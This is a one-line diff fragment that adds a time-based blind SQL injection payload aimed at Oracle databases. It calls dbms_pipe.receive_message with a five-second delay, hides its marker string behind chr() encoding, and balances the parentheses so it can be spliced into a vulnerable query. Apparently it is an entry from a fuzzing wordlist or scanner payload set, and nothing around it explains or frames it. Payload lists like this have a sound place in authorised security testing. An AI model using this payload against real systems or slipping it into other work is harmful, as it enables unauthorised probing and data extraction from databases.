@@ -1,0 +1,1 @@
+1) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (8898=8898
